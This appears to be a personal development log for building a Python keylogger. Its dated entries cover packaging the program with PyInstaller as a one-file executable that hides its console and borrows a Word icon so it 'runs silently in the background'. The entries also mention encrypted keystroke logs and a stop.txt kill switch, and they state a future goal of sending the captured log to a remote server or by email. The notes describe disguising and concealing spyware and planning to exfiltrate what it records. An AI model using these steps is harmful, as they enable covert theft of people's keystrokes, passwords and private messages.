pyinstaller --onefile keylogger_test.py
Optional flags:

--noconsole: hides the terminal window when you double-click the .exe

--icon=icon.ico: sets a custom icon.

Example:

bash
Copy
Edit
pyinstaller --onefile --noconsole --icon=word.ico keylogger_test.py
The generated .exe file will be in the dist/ folder.

when code is done, run this in term window to make the program an exe file that runs silently in the background:
pyinstaller --onefile --noconsole --icon=word.ico keylogger_test.py

this program would write out the encrypted data to the log.

next step: work on logger



4/27
Make a stop.txt file in downloads to get the program to stop. will test before its hidden in background

Next steps are to deecide which main i use. Need to make sure i can kill the program properly

Test the program with the threading, moved kill switch checker out side of while loop, got rid of while loop
next step is to test the kill switch

5/1

program runs and now wites to files. I added the stop.txt file for logging. just to make sure my program stopped.
Next step is to make the program run in the background, and figure out how to use the code at the top to make it
hidden. Future goal is to see if i can send the log file to a remote server or email it to myself.
